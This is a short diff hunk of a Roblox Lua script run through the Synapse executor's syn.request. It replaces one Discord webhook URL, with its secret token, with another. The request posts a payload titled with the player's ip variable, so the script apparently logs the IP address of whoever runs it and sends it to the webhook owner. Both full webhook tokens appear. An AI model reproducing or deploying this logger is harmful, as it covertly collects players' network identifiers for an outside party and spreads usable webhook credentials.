@@ -21,7 +21,7 @@ if game.Players.LocalPlayer.Name == "masterofthec0k" or game.Players.LocalPlayer
 end
 
 syn.request({
-    Url = "https://discordapp.com/api/webhooks/767480533671739422/Jkhoo2Cy7VBicAofISp9E1vuL51PZwpp9ZJOcL13SZELpc6IVOHHMuvEhF8Bkd68R3f0", 
+    Url = "https://discord.com/api/webhooks/1039964656950853663/wW0l5MynaSMgm75pl2G7C3MrpCaijnbaNkPJvnVT4aYO_iCOo-cq1ucx0yQuuL27H0St", 
     Body = game:GetService("HttpService"):JSONEncode({
         ["embeds"]={{
             ["title"]="||"..ip.."||",
